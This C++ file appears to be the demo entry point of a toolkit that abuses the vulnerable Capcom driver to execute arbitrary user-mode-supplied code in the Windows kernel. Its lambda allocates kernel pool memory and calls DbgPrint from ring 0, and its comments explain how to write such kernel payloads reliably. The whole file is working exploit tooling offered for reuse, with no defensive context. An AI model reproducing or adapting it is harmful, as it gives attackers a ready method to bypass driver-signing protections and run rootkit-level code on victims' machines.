#include <iostream>
#include <assert.h>
#include "LockedMemory.h"
#include "KernelRoutines.h"
#include "CapcomLoader.h"
#include "KernelHelper.h"

int main()
{
	if ( Np_LockSections() )
	{
		KernelContext* KrCtx = Kr_InitContext();
		CapcomContext* CpCtx = Cl_InitContext();

		assert( CpCtx );
		assert( KrCtx );

		Khu_Init( CpCtx, KrCtx );
		printf( "[+] Khk_PassiveCall @ %16llx\n", Khk_PassiveCallStub );

		NON_PAGED_DATA static char Format[] = "Jan said: %s %s %s %s";
		NON_PAGED_DATA static auto DbgPrint = KrCtx->GetProcAddress<>( "DbgPrint" );
		NON_PAGED_DATA static PVOID AllocatedMemory = 0;

		CpCtx->ExecuteInKernel( NON_PAGED_LAMBDA()
		{
			// When you do something that requires interrupts to be enabled, use Khk_PassiveCall; such as a big memory allocation
			PVOID Out = ( PVOID ) Khk_CallPassive( Khk_ExAllocatePool, 0ull, 0x100000 );
			// Do not use memcpy, memset or ZeroMemory in kernel context; use Np_XXX equivalents
			Np_ZeroMemory( Out, 0x100000 );
			
			// Make sure all the UM data you reference from kernel has NON_PAGED_DATA prefix
			AllocatedMemory = Out;
			Format[ 0 ] = 'C';
			
			// Do not call _enable()
			// _enable();

			// When you require a kernel api to be called use KrCtx to get it BEFORE you are in kernel context.
			// MmGetSystemRoutineAddress requires IRQL==PASSIVE_LEVEL and is bad engineering on capcom's side.

			// You can use data without NON_PAGED_DATA prefix in Khk_PassiveCall though.
			Khk_CallPassive( DbgPrint, Format, "Hey!", "Oy!", "Kek!", "AAAA!" );
		} );

		printf( "[+] AllocatedMemory @ %16llx\n", AllocatedMemory );

		Cl_FreeContext( CpCtx );
		Kr_FreeContext( KrCtx );
	}
	
	return 0;
}

